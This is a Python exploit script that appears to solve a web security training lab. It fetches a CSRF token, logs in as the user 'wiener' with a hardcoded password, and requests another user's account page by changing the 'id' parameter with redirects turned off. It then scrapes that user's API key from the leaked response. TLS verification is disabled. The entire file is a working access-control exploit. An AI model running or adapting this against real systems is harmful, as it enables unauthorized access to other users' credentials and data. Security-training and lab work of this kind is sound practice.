import requests
import sys
import re
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

def get_csrf_token(s, url) :
    r = s.get(url, verify=False, proxies=proxies)
    matches = re.search(r'<input required type="hidden" name="csrf" value="(.*)">', r.text)
    if matches :
        csrf =matches.group(1)
        return csrf
    else :
        return None

def broken_authentification_exploit(session, url) :
    # Get CSRF token  
    login_url = url + "/login"
    csrf_token = get_csrf_token(session, login_url)
    
    # Login as the wiener user
    data = {"csrf":csrf_token, 'username':'wiener', 'password':'peter'}
    r = session.post(login_url, data=data, verify=False, proxies=proxies)
    
    if "Log out" in r.text :
        
        print("(+) The wiener user has logged in successfully!")
        print('(+) Retrieving the carlos user api key...')
        carlos_url = url + "/my-account?id=carlos"
        r = session.get(carlos_url, allow_redirects=False, verify=False, proxies=proxies)
        matches = re.search(r'<div>Your API Key is: (.*)</div>', r.text)
        
        if matches :
            api_key = matches.group(1)
            print("(+) Here is the carlos' api key : " + api_key)
        else :
            print("(-) Could not retrieve the carlos' user api key.")
            
    else :
        print("Could not login as the wiener user!")

if __name__ == "__main__" :
    try :
        url = sys.argv[1].strip()
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    session = requests.Session()
    broken_authentification_exploit(session, url)